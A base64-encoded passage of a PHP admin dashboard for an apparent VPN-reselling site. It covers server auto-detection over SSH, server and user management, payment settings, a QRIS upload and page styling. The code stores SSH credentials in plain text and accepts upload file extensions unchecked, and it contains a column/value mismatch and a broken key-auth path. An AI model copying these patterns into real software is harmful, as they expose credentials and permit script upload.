8sIHByb2Nlc3NlZF9hdD1OT1coKSBXSEVSRSBpZD0/IikKICAgICAgICAgICAtPmV4ZWN1dGUoW3Nhbml0aXplKCRfUE9TVFsnbm90ZSddPz8nJyksJHRpZF0pOwogICAgICAgIGhlYWRlcignTG9jYXRpb246IC9vcmRlcnZwbi9hZG1pbi8nKTsgZXhpdDsKICAgIH0KCiAgICBpZiAoJGFjdD09PSdhdXRvX2RldGVjdF9zZXJ2ZXInKSB7CiAgICAgICAgJGlwICAgICAgPSBzYW5pdGl6ZSgkX1BPU1RbJ2hvc3QnXSA/PyAnJyk7CiAgICAgICAgJHBvcnQgICAgPSAoaW50KSgkX1BPU1RbJ3BvcnQnXSA/PyAyMik7CiAgICAgICAgJHVzZXIgICAgPSBzYW5pdGl6ZSgkX1BPU1RbJ3NzaF91c2VyJ10gPz8gJ3Jvb3QnKTsKICAgICAgICAkcGFzcyAgICA9ICRfUE9TVFsnc3NoX3Bhc3N3b3JkJ10gPz8gJyc7CiAgICAgICAgJHNzaEtleSAgPSAkX1BPU1RbJ3NzaF9rZXknXSA/PyAnJzsKICAgICAgICAkYXV0aFR5cGUgPSAkX1BPU1RbJ2F1dGhfdHlwZSddID8/ICdwYXNzd29yZCc7CiAgICAgICAgCiAgICAgICAgaWYgKCRhdXRoVHlwZSA9PT0gJ2tleScgJiYgZW1wdHkoJHNzaEtleSkpIHsKICAgICAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLz9hdXRvX2Vycm9yPScgLiB1cmxlbmNvZGUoJ1NTSCBLZXkgcGF0aCB3YWppYiBkaWlzaScpKTsKICAgICAgICAgICAgZXhpdDsKICAgICAgICB9CiAgICAgICAgaWYgKCRhdXRoVHlwZSA9PT0gJ3Bhc3N3b3JkJyAmJiBlbXB0eSgkcGFzcykpIHsKICAgICAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLz9hdXRvX2Vycm9yPScgLiB1cmxlbmNvZGUoJ1Bhc3N3b3JkIHdhamliIGRpaXNpJykpOwogICAgICAgICAgICBleGl0OwogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBCdWlsZCBwcm9iZSBjb21tYW5kIGJhc2VkIG9uIGF1dGggdHlwZQogICAgICAgIGlmICgkYXV0aFR5cGUgPT09ICdrZXknKSB7CiAgICAgICAgICAgIC8vIEZvciBTU0gga2V5LCB1c2UgZW1wdHkgcGFzc3dvcmQgKGJyaWRnZSB3aWxsIHVzZSBrZXkpCiAgICAgICAgICAgICRwYXNzID0gJyc7CiAgICAgICAgfQogICAgICAgICRjb2RlICAgID0gc2FuaXRpemUoJF9QT1NUWydjb2RlX3NlcnZlciddID8/ICcnKTsKICAgICAgICAkbmFtYSAgICA9IHNhbml0aXplKCRfUE9TVFsnbmFtYV9zZXJ2ZXInXSA/PyAnJyk7CiAgICAgICAgCiAgICAgICAgaWYgKGVtcHR5KCRpcCkgfHwgZW1wdHkoJHBhc3MpIHx8IGVtcHR5KCRjb2RlKSkgewogICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvb3JkZXJ2cG4vYWRtaW4vP2F1dG9fZXJyb3I9JyAuIHVybGVuY29kZSgnSVAsIFBhc3N3b3JkLCBkYW4gS29kZSBTZXJ2ZXIgd2FqaWIgZGlpc2knKSk7CiAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIFBhbmdnaWwgdnBuLWFwaSBwcm9iZQogICAgICAgICRjbWQgPSAidGltZW91dCAzMCB2cG4tYXBpIHByb2JlICIgLiBlc2NhcGVzaGVsbGFyZygkaXApIC4gIiAiIC4gZXNjYXBlc2hlbGxhcmcoJHVzZXIpIC4gIiAiIC4gZXNjYXBlc2hlbGxhcmcoJHBhc3MpIC4gIiAiIC4gJHBvcnQgLiAiIDI+L2Rldi9udWxsIjsKICAgICAgICAkb3V0cHV0ID0gc2hlbGxfZXhlYygkY21kKTsKICAgICAgICAkcmVzdWx0ID0ganNvbl9kZWNvZGUoJG91dHB1dCwgdHJ1ZSk7CiAgICAgICAgCiAgICAgICAgaWYgKCEkcmVzdWx0IHx8IGVtcHR5KCRyZXN1bHRbJ3N1Y2Nlc3MnXSkpIHsKICAgICAgICAgICAgJG1zZyA9ICRyZXN1bHRbJ21lc3NhZ2UnXSA/PyAnR2FnYWwga29uZWtzaSBrZSBzZXJ2ZXIgcmVtb3RlJzsKICAgICAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLz9hdXRvX2Vycm9yPScgLiB1cmxlbmNvZGUoJG1zZykpOwogICAgICAgICAgICBleGl0OwogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBBdXRvLWZpbGwgZGFyaSBoYXNpbCBwcm9iZQogICAgICAgICRsb2thc2kgPSAkcmVzdWx0WydyZWdpb24nXSA/PyAnVW5rbm93bic7CiAgICAgICAgJGRvbWFpbiA9ICRyZXN1bHRbJ2RvbWFpbiddID8/ICcnOwogICAgICAgICRmbGFnICAgPSBkZXRlY3RGbGFnKCRsb2thc2kpOwogICAgICAgIAogICAgICAgIGlmIChlbXB0eSgkbmFtYSkpIHsKICAgICAgICAgICAgJG5hbWEgPSAkcmVzdWx0WydyZWdpb24nXSA/IGV4cGxvZGUoJywnLCAkcmVzdWx0WydyZWdpb24nXSlbMF0gOiAkaXA7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIFNpbXBhbiBrZSBkYXRhYmFzZQogICAgICAgICRkYi0+cHJlcGFyZSgiSU5TRVJUIElOVE8gc2VydmVycyAobmFtYV9zZXJ2ZXIsY29kZV9zZXJ2ZXIsbG9rYXNpLGZsYWcsaGFyZ2FfaGFyaSxoYXJnYV9idWxhbixob3N0LHBvcnQsc3NoX3VzZXIsc3NoX3Bhc3N3b3JkLGRvbWFpbixzdGF0dXMpCiAgICAgICAgICAgIFZBTFVFUyAoPyw/LD8sPyw/LD8sPyw/LD8sPyw/LCdyZWFkeScpIikKICAgICAgICAgICAtPmV4ZWN1dGUoWwogICAgICAgICAgICAgICAkbmFtYSwKICAgICAgICAgICAgICAgJGNvZGUsCiAgICAgICAgICAgICAgICRsb2thc2ksCiAgICAgICAgICAgICAgICRmbGFnLAogICAgICAgICAgICAgICAoZmxvYXQpKCRfUE9TVFsnaGFyZ2FfaGFyaSddID8/IDMwMCksCiAgICAgICAgICAgICAgIChmbG9hdCkoJF9QT1NUWydoYXJnYV9idWxhbiddID8/IDkwMDApLAogICAgICAgICAgICAgICAkaXAsCiAgICAgICAgICAgICAgICRwb3J0LAogICAgICAgICAgICAgICAkdXNlciwKICAgICAgICAgICAgICAgJHBhc3MsCiAgICAgICAgICAgICAgICRzc2hLZXksCiAgICAgICAgICAgICAgICRkb21haW4sCiAgICAgICAgICAgXSk7CiAgICAgICAgCiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLz9hdXRvX3N1Y2Nlc3M9JyAuIHVybGVuY29kZSgiU2VydmVyICRjb2RlICgkaXApIGJlcmhhc2lsIGRpdGFtYmFoa2FuISBSZWdpb246ICRsb2thc2kiKSk7CiAgICAgICAgZXhpdDsKICAgIH0KICAgIAppZiAoJGFjdD09PSdhZGRfc2VydmVyJykgewogICAgICAgICRkYi0+cHJlcGFyZSgiSU5TRVJUIElOVE8gc2VydmVycyAobmFtYV9zZXJ2ZXIsY29kZV9zZXJ2ZXIsbG9rYXNpLGZsYWcsaGFyZ2FfaGFyaSxoYXJnYV9idWxhbixob3N0LHBvcnQsc3NoX3VzZXIsc3NoX3Bhc3N3b3JkLHNzaF9rZXksZG9tYWluLHN0YXR1cykgVkFMVUVTICg/LD8sPyw/LD8sPyw/LD8sPyw/LD8sPywncmVhZHknKSIpCiAgICAgICAgICAgLT5leGVjdXRlKFsKICAgICAgICAgICAgICAgc2FuaXRpemUoJF9QT1NUWyduYW1hX3NlcnZlciddKSwgc2FuaXRpemUoJF9QT1NUWydjb2RlX3NlcnZlciddKSwKICAgICAgICAgICAgICAgc2FuaXRpemUoJF9QT1NUWydsb2thc2knXSksIHNhbml0aXplKCRfUE9TVFsnZmxhZyddPz8n8J+HrvCfh6knKSwKICAgICAgICAgICAgICAgKGZsb2F0KSRfUE9TVFsnaGFyZ2FfaGFyaSddLCAoZmxvYXQpJF9QT1NUWydoYXJnYV9idWxhbiddLAogICAgICAgICAgICAgICBzYW5pdGl6ZSgkX1BPU1RbJ2hvc3QnXSksIChpbnQpKCRfUE9TVFsncG9ydCddPz8yMiksCiAgICAgICAgICAgICAgIHNhbml0aXplKCRfUE9TVFsnc3NoX3VzZXInXT8/J3Jvb3QnKSwgc2FuaXRpemUoJF9QT1NUWydzc2hfcGFzc3dvcmQnXT8/JycpLAogICAgICAgICAgICAgICBzYW5pdGl6ZSgkX1BPU1RbJ3NzaF9rZXknXT8/JycpLCBzYW5pdGl6ZSgkX1BPU1RbJ2RvbWFpbiddPz8nJyksCiAgICAgICAgICAgXSk7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLycpOyBleGl0OwogICAgfQoKICAgIGlmICgkYWN0PT09J2RlbGV0ZV9zZXJ2ZXInKSB7CiAgICAgICAgJGRiLT5wcmVwYXJlKCJERUxFVEUgRlJPTSBzZXJ2ZXJzIFdIRVJFIGlkPT8iKS0+ZXhlY3V0ZShbKGludCkkX1BPU1RbJ3NlcnZlcl9pZCddXSk7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLycpOyBleGl0OwogICAgfQoKICAgIGlmICgkYWN0PT09J3NhdmVfc2V0dGluZ3MnKSB7CiAgICAgICAgJGtleXM9WydhcHBfbmFtZScsJ2FwcF9sb2dvJywnY29udGFjdF93YScsJ2NvbnRhY3RfdGcnLCdjb250YWN0X2lnJywKICAgICAgICAgICAgICAgJ2JhbmtfbmFtZScsJ2JhbmtfYWNjb3VudCcsJ2JhbmtfaG9sZGVyJywnZGFuYV9udW1iZXInLCdnb3BheV9udW1iZXInLCdzaG9wZWVfbnVtYmVyJywKICAgICAgICAgICAgICAgJ3NtdHBfaG9zdCcsJ3NtdHBfcG9ydCcsJ3NtdHBfdXNlcicsJ3NtdHBfcGFzcycsJ3NtdHBfZnJvbScsCiAgICAgICAgICAgICAgICd0Z19ib3RfdG9rZW4nLCd0Z19jaGF0X2lkJywndHJpcGF5X2FwaV9rZXknLCd0cmlwYXlfcHJpdmF0ZV9rZXknLCd0cmlwYXlfbWVyY2hhbnRfY29kZScsJ3RyaXBheV9tb2RlJywKICAgICAgICAgICAgICAgJ3RyaWFsX2R1cmF0aW9uX2hvdXJzJywndHJpYWxfcXVvdGFfZ2InLCdhbm5vdW5jZV8xJywnYW5ub3VuY2VfMicsJ2Fubm91bmNlXzMnXTsKICAgICAgICBmb3JlYWNoKCRrZXlzIGFzICRrKXsKICAgICAgICAgICAgaWYoaXNzZXQoJF9QT1NUWyRrXSkpewogICAgICAgICAgICAgICAgJGRiLT5wcmVwYXJlKCJJTlNFUlQgSU5UTyBhcHBfc2V0dGluZ3MgKHNldHRpbmdfa2V5LHNldHRpbmdfdmFsdWUpIFZBTFVFUyAoPyw/KSBPTiBEVVBMSUNBVEUgS0VZIFVQREFURSBzZXR0aW5nX3ZhbHVlPT8iKQogICAgICAgICAgICAgICAgICAgLT5leGVjdXRlKFskayxzYW5pdGl6ZSgkX1BPU1RbJGtdKSxzYW5pdGl6ZSgkX1BPU1RbJGtdKV0pOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIC8vIFFSSVMgaW1hZ2UgdXBsb2FkCiAgICAgICAgaWYgKCFlbXB0eSgkX0ZJTEVTWydxcmlzX2ltYWdlJ11bJ3RtcF9uYW1lJ10pKSB7CiAgICAgICAgICAgICR1cGxvYWREaXI9X19ESVJfXy4nLy4uL3VwbG9hZHMvJzsgaWYoIWlzX2RpcigkdXBsb2FkRGlyKSkgbWtkaXIoJHVwbG9hZERpciwwNzU1LHRydWUpOwogICAgICAgICAgICAkZXh0PXBhdGhpbmZvKCRfRklMRVNbJ3FyaXNfaW1hZ2UnXVsnbmFtZSddLFBBVEhJTkZPX0VYVEVOU0lPTik7CiAgICAgICAgICAgICRmbmFtZT0ncXJpcy4nLiRleHQ7CiAgICAgICAgICAgIGlmKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydxcmlzX2ltYWdlJ11bJ3RtcF9uYW1lJ10sJHVwbG9hZERpci4kZm5hbWUpKXsKICAgICAgICAgICAgICAgICRkYi0+cHJlcGFyZSgiSU5TRVJUIElOVE8gYXBwX3NldHRpbmdzIChzZXR0aW5nX2tleSxzZXR0aW5nX3ZhbHVlKSBWQUxVRVMgKCdxcmlzX2ltYWdlJyw/KSBPTiBEVVBMSUNBVEUgS0VZIFVQREFURSBzZXR0aW5nX3ZhbHVlPT8iKQogICAgICAgICAgICAgICAgICAgLT5leGVjdXRlKFsnL29yZGVydnBuL3VwbG9hZHMvJy4kZm5hbWUsJy9vcmRlcnZwbi91cGxvYWRzLycuJGZuYW1lXSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLz9zYXZlZD0xJyk7IGV4aXQ7CiAgICB9CgogICAgaWYgKCRhY3Q9PT0ndG9nZ2xlX3NlcnZlcicpIHsKICAgICAgICAkc2lkPShpbnQpJF9QT1NUWydzZXJ2ZXJfaWQnXTsgJHM9c2FuaXRpemUoJF9QT1NUWydzdGF0dXMnXSk7CiAgICAgICAgJGRiLT5wcmVwYXJlKCJVUERBVEUgc2VydmVycyBTRVQgc3RhdHVzPT8gV0hFUkUgaWQ9PyIpLT5leGVjdXRlKFskcywkc2lkXSk7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLycpOyBleGl0OwogICAgfQoKICAgIGlmICgkYWN0PT09J2RlbGV0ZV91c2VyJykgewogICAgICAgICR1aWQ9KGludCkkX1BPU1RbJ3VzZXJfaWQnXTsKICAgICAgICBpZigkdWlkIT09JHNlc3Npb25bJ3VzZXJfaWQnXSkgJGRiLT5wcmVwYXJlKCJERUxFVEUgRlJPTSB1c2VycyBXSEVSRSBpZD0/IiktPmV4ZWN1dGUoWyR1aWRdKTsKICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvb3JkZXJ2cG4vYWRtaW4vJyk7IGV4aXQ7CiAgICB9Cn0KCi8vIFN0YXRzCiRzdGF0cyA9IFsKICAgICd1c2VycycgICAgPT4gJGRiLT5xdWVyeSgiU0VMRUNUIENPVU5UKCopIEZST00gdXNlcnMgV0hFUkUgcm9sZT0ndXNlciciKS0+ZmV0Y2hDb2x1bW4oKSwKICAgICdha3VuJyAgICAgPT4gJGRiLT5xdWVyeSgiU0VMRUNUIENPVU5UKCopIEZST00gdnBuX2FjY291bnRzIFdIRVJFIHN0YXR1cz0nYWN0aXZlJyIpLT5mZXRjaENvbHVtbigpLAogICAgJ3RvcHVwX3AnICA9PiAkZGItPnF1ZXJ5KCJTRUxFQ1QgQ09VTlQoKikgRlJPTSB0b3B1cF9yZXF1ZXN0cyBXSEVSRSBzdGF0dXM9J3BlbmRpbmcnIiktPmZldGNoQ29sdW1uKCksCiAgICAncmV2ZW51ZScgID0+ICRkYi0+cXVlcnkoIlNFTEVDVCBDT0FMRVNDRShTVU0oYW1vdW50KSwwKSBGUk9NIHRyYW5zYWN0aW9ucyBXSEVSRSB0eXBlPSd0b3B1cCcgQU5EIHN0YXR1cz0nc3VjY2VzcyciKS0+ZmV0Y2hDb2x1bW4oKSwKICAgICdvcmRlcnMnICAgPT4gJGRiLT5xdWVyeSgiU0VMRUNUIENPVU5UKCopIEZST00gdHJhbnNhY3Rpb25zIFdIRVJFIHR5cGU9J29yZGVyJyIpLT5mZXRjaENvbHVtbigpLApdOwoKJHBlbmRpbmdUb3B1cHMgPSAkZGItPnF1ZXJ5KCJTRUxFQ1QgdHIuKiwgdS51c2VybmFtZSwgdS5lbWFpbCBGUk9NIHRvcHVwX3JlcXVlc3RzIHRyIEpPSU4gdXNlcnMgdSBPTiB0ci51c2VyX2lkPXUuaWQgV0hFUkUgdHIuc3RhdHVzPSdwZW5kaW5nJyBPUkRFUiBCWSB0ci5jcmVhdGVkX2F0IERFU0MiKS0+ZmV0Y2hBbGwoKTsKJGFsbFRvcHVwcyAgICAgPSAkZGItPnF1ZXJ5KCJTRUxFQ1QgdHIuKiwgdS51c2VybmFtZSBGUk9NIHRvcHVwX3JlcXVlc3RzIHRyIEpPSU4gdXNlcnMgdSBPTiB0ci51c2VyX2lkPXUuaWQgT1JERVIgQlkgdHIuY3JlYXRlZF9hdCBERVNDIExJTUlUIDUwIiktPmZldGNoQWxsKCk7CiRzZXJ2ZXJzICAgICAgID0gJGRiLT5xdWVyeSgiU0VMRUNUICogRlJPTSBzZXJ2ZXJzIE9SREVSIEJZIG5hbWFfc2VydmVyIiktPmZldGNoQWxsKCk7CiR1c2VycyAgICAgICAgID0gJGRiLT5xdWVyeSgiU0VMRUNUICogRlJPTSB1c2VycyBPUkRFUiBCWSBjcmVhdGVkX2F0IERFU0MgTElNSVQgMTAwIiktPmZldGNoQWxsKCk7CiRvcmRlcnMgICAgICAgID0gJGRiLT5xdWVyeSgiU0VMRUNUIHQuKiwgdS51c2VybmFtZSBGUk9NIHRyYW5zYWN0aW9ucyB0IEpPSU4gdXNlcnMgdSBPTiB0LnVzZXJfaWQ9dS5pZCBXSEVSRSB0LnR5cGU9J29yZGVyJyBPUkRFUiBCWSB0LmNyZWF0ZWRfYXQgREVTQyBMSU1JVCA1MCIpLT5mZXRjaEFsbCgpOwokYWxsQWt1bnMgICAgICA9ICRkYi0+cXVlcnkoIlNFTEVDVCB2YS4qLCB1LnVzZXJuYW1lIGFzIHVuYW1lLCBzLm5hbWFfc2VydmVyIEZST00gdnBuX2FjY291bnRzIHZhIEpPSU4gdXNlcnMgdSBPTiB2YS51c2VyX2lkPXUuaWQgSk9JTiBzZXJ2ZXJzIHMgT04gdmEuc2VydmVyX2lkPXMuaWQgT1JERVIgQlkgdmEuY3JlYXRlZF9hdCBERVNDIExJTUlUIDUwIiktPmZldGNoQWxsKCk7CgokYXBwTmFtZSA9IGdldFNldHRpbmcoJ2FwcF9uYW1lJywnT3JkZXJWUE4nKTsKJHNhdmVkICAgPSBpc3NldCgkX0dFVFsnc2F2ZWQnXSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJpZCI+CjxoZWFkPgo8bWV0YSBjaGFyc2V0PSJVVEYtOCI+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlPTEiPgo8dGl0bGU+QWRtaW4g4oCUIDw/PSRhcHBOYW1lPz48L3RpdGxlPgo8c3R5bGU+CiAgICAgICAgOnJvb3QgewogICAgICAgICAgICAtLWJnOiAgICAgICAgICAgIzA4MGMxNDsKICAgICAgICAgICAgLS1iZy1hbHQ6ICAgICAgICMwYzExMWI7CiAgICAgICAgICAgIC0tY2FyZDogICAgICAgICAjMTExODI3OwogICAgICAgICAgICAtLWNhcmQtaG92ZXI6ICAgIzE2MWUyZTsKICAgICAgICAgICAgLS1ib3JkZXI6ICAgICAgICMxZTI5M2I7CiAgICAgICAgICAgIC0tYm9yZGVyLWxpZ2h0OiAjMjYzMzQ4OwogICAgICAgICAgICAtLXRleHQ6ICAgICAgICAgI2UyZThmMDsKICAgICAgICAgICAgLS10ZXh0LWRpbTogICAgICM5NGEzYjg7CiAgICAgICAgICAgIC0tbXV0ZWQ6ICAgICAgICAjNjQ3NDhiOwogICAgICAgICAgICAtLXByaW1hcnk6ICAgICAgIzYzNjZmMTsKICAgICAgICAgICAgLS1wcmltYXJ5LWRpbTogICM0ZjQ2ZTU7CiAgICAgICAgICAgIC0tYWNjZW50OiAgICAgICAjODE4Y2Y4OwogICAgICAgICAgICAtLXN1Y2Nlc3M6ICAgICAgIzEwYjk4MTsKICAgICAgICAgICAgLS13YXJuaW5nOiAgICAgICNmNTllMGI7CiAgICAgICAgICAgIC0tZGFuZ2VyOiAgICAgICAjZWY0NDQ0OwogICAgICAgICAgICAtLWluZm86ICAgICAgICAgIzNiODJmNjsKICAgICAgICAgICAgLS1yYWRpdXM6ICAgICAgIDEycHg7CiAgICAgICAgICAgIC0tcmFkaXVzLXNtOiAgICA4cHg7CiAgICAgICAgICAgIC0tc2hhZG93OiAgICAgICAwIDFweCAzcHggcmdiYSgwLDAsMCwuMyksIDAgMXB4IDJweCByZ2JhKDAsMCwwLC4yKTsKICAgICAgICAgICAgLS1zaGFkb3ctbGc6ICAgIDAgMTBweCAyNXB4IHJnYmEoMCwwLDAsLjQpOwogICAgICAgICAgICAtLXRyYW5zaXRpb246ICAgMC4ycyBjdWJpYy1iZXppZXIoLjQsMCwuMiwxKTsKICAgICAgICB9CiAgICAgICAgKiB7IGJveC1zaXppbmc6Ym9yZGVyLWJveDsgbWFyZ2luOjA7IHBhZGRpbmc6MDsgfQogICAgICAgIGJvZHkgewogICAgICAgICAgICBmb250LWZhbWlseTogJ0ludGVyJywgJ1NlZ29lIFVJJywgc3lzdGVtLXVpLCAtYXBwbGUtc3lzdGVtLCBzYW5zLXNlcmlmOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1iZyk7CiAgICAgICAgICAgIGNvbG9yOiB2YXIoLS10ZXh0KTsKICAgICAgICAgICAgbWluLWhlaWdodDogMTAwdmg7CiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxLjY7CiAgICAgICAgICAgIC13ZWJraXQtZm9udC1zbW9vdGhpbmc6IGFudGlhbGlhc2VkOwogICAgICAgIH0KICAgICAgICBhIHsgY29sb3I6IHZhcigtLWFjY2VudCk7IHRleHQtZGVjb3JhdGlvbjpub25lOyB0cmFuc2l0aW9uOiB2YXIoLS10cmFuc2l0aW9uKTsgfQogICAgICAgIGE6aG92ZXIgeyBjb2xvcjogdmFyKC0tcHJpbWFyeSk7IH0KICAgICAgICAudG9wYmFyIHsKICAgICAgICAgICAgcG9zaXRpb246IHN0aWNreTsgdG9wOjA7IHotaW5kZXg6MTAwOwogICAgICAgICAgICBkaXNwbGF5OmZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsganVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47CiAgICAgICAgICAgIHBhZGRpbmc6IDAgMjRweDsgaGVpZ2h0OiA2MHB4OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDEyLDE3LDI3LC44NSk7CiAgICAgICAgICAgIGJhY2tkcm9wLWZpbHRlcjogYmx1cigxNnB4KSBzYXR1cmF0ZSgxODAlKTsKICAgICAgICAgICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkIHZhcigtLWJvcmRlcik7CiAgICAgICAgICAgIGdhcDogMTZweDsKICAgICAgICB9CiAgICAgICAgLnRvcGJhci1icmFuZCB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4xZW07IGZvbnQtd2VpZ2h0OiA3MDA7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsIHZhcigtLXByaW1hcnkpLCB2YXIoLS1hY2NlbnQpKTsKICAgICAgICAgICAgLXdlYmtpdC1iYWNrZ3JvdW5kLWNsaXA6IHRleHQ7IGJhY2tncm91bmQtY2xpcDogdGV4dDsgY29sb3I6IHRyYW5zcGFyZW50OwogICAgICAgICAgICBsZXR0ZXItc3BhY2luZzogLS4zcHg7CiAgICAgICAgfQogICAgICAgIC50b3BiYXItYWN0aW9ucyB7IGRpc3BsYXk6ZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBnYXA6IDEycHg7IH0KICAgICAgICAuYWRtaW4tYmFkZ2UgewogICAgICAgICAgICBmb250LXNpemU6IC43NWVtOyBmb250LXdlaWdodDogNjAwOyB0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlOwogICAgICAgICAgICBsZXR0ZXItc3BhY2luZzogLjhweDsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSg5OSwxMDIsMjQxLC4xNSk7IGNvbG9yOiB2YXIoLS1wcmltYXJ5KTsKICAgICAgICAgICAgcGFkZGluZzogNHB4IDEwcHg7IGJvcmRlci1yYWRpdXM6IDIwcHg7CiAgICAgICAgfQogICAgICAgIC5sYXlvdXQgeyBkaXNwbGF5OmZsZXg7IG1pbi1oZWlnaHQ6IGNhbGMoMTAwdmggLSA2MHB4KTsgfQogICAgICAgIC5zaWRlYmFyIHsKICAgICAgICAgICAgd2lkdGg6IDI0MHB4OyBtaW4td2lkdGg6IDI0MHB4OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1jYXJkKTsKICAgICAgICAgICAgYm9yZGVyLXJpZ2h0OiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsKICAgICAgICAgICAgZGlzcGxheTpmbGV4OyBmbGV4LWRpcmVjdGlvbjpjb2x1bW47CiAgICAgICAgICAgIG92ZXJmbG93LXk6IGF1dG87CiAgICAgICAgfQogICAgICAgIC5tYWluIHsgZmxleDoxOyBwYWRkaW5nOiAyOHB4IDMycHg7IG92ZXJmbG93LXk6IGF1dG87IG1heC13aWR0aDogMTI4MHB4OyB9CiAgICAgICAgLnNpZGViYXItbG9nbyB7IGRpc3BsYXk6ZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBnYXA6IDEycHg7IHBhZGRpbmc6IDIwcHggMThweCAxNnB4OyB9CiAgICAgICAgLnNpZGViYXItYnJhbmQgeyBsaW5lLWhlaWdodDoxLjM7IH0KICAgICAgICAuc2lkZWJhci1icmFuZC1uYW1lIHsgZm9udC1zaXplOjEuMDVlbTsgZm9udC13ZWlnaHQ6NzAwOyBjb2xvcjp2YXIoLS10ZXh0KTsgbGV0dGVyLXNwYWNpbmc6LS4ycHg7IH0KICAgICAgICAuc2lkZWJhci1icmFuZC12ZXIgeyBmb250LXNpemU6LjY4ZW07IGNvbG9yOnZhcigtLW11dGVkKTsgZm9udC13ZWlnaHQ6NTAwOyB9CiAgICAgICAgLnNpZGViYXItZGl2aWRlciB7IGhlaWdodDoxcHg7IGJhY2tncm91bmQ6dmFyKC0tYm9yZGVyKTsgbWFyZ2luOjAgMTRweCAxMnB4OyB9CiAgICAgICAgLnRhYnMgeyBkaXNwbGF5OmZsZXg7IGZsZXgtZGlyZWN0aW9uOmNvbHVtbjsgZ2FwOjJweDsgcGFkZGluZzowIDhweDsgfQogICAgICAgIC50YWItYnRuIHsKICAgICAgICAgICAgd2lkdGg6MTAwJTsgdGV4dC1hbGlnbjpsZWZ0OwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4IDE0cHg7IGJvcmRlci1yYWRpdXM6IHZhcigtLXJhZGl1cy1zbSk7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3JkZXI6IG5vbmU7IGNvbG9yOiB2YXIoLS10ZXh0LWRpbSk7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogLjg4ZW07IGZvbnQtd2VpZ2h0OiA1MDA7IGN1cnNvcjogcG9pbnRlcjsKICAgICAgICAgICAgdHJhbnNpdGlvbjogdmFyKC0tdHJhbnNpdGlvbik7CiAgICAgICAgICAgIGxldHRlci1zcGFjaW5nOiAuMXB4OwogICAgICAgIH0KICAgICAgICAudGFiLWJ0bjpob3ZlciB7IGJhY2tncm91bmQ6IHJnYmEoOTksMTAyLDI0MSwuMDgpOyBjb2xvcjogdmFyKC0tdGV4dCk7IH0KICAgICAgICAudGFiLWJ0bi5hY3RpdmUgeyBiYWNrZ3JvdW5kOiByZ2JhKDk5LDEwMiwyNDEsLjEyKTsgY29sb3I6IHZhcigtLXByaW1hcnkpOyBmb250LXdlaWdodDogNjAwOyB9CiAgICAgICAgLnNpZGViYXItbGlua3MgeyBtYXJnaW4tdG9wOiBhdXRvOyBwYWRkaW5nOiAxMnB4IDE0cHg7IGJvcmRlci10b3A6IDFweCBzb2xpZCB2YXIoLS1ib3JkZXIpOyBkaXNwbGF5OmZsZXg7IGZsZXgtZGlyZWN0aW9uOmNvbHVtbjsgZ2FwOjRweDsgfQogICAgICAgIC5zaWRlYmFyLWxpbmsgewogICAgICAgICAgICBkaXNwbGF5OmJsb2NrOyBwYWRkaW5nOiA4cHggMTJweDsgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzLXNtKTsKICAgICAgICAgICAgZm9udC1zaXplOiAuODJlbTsgZm9udC13ZWlnaHQ6IDUwMDsgY29sb3I6IHZhcigtLXRleHQtZGltKTsKICAgICAgICAgICAgdHJhbnNpdGlvbjogdmFyKC0tdHJhbnNpdGlvbik7CiAgICAgICAgfQogICAgICAgIC5zaWRlYmFyLWxpbms6aG92ZXIgeyBiYWNrZ3JvdW5kOiByZ2JhKDk5LDEwMiwyNDEsLjA4KTsgY29sb3I6IHZhcigtLXRleHQpOyB9CiAgICAgICAgLnNpZGViYXItbGluay5kYW5nZXIgeyBjb2xvcjogdmFyKC0tZGFuZ2VyKTsgfQogICAgICAgIC5zaWRlYmFyLWxpbmsuZGFuZ2VyOmhvdmVyIHsgYmFja2dyb3VuZDogcmdiYSgyMzksNjgsNjgsLjEpOyB9CiAgICAgICAgLnBhZ2UgeyBkaXNwbGF5Om5vbmU7IH0KICAgICAgICAucGFnZS5hY3RpdmUgeyBkaXNwbGF5OmJsb2NrOyBhbmltYXRpb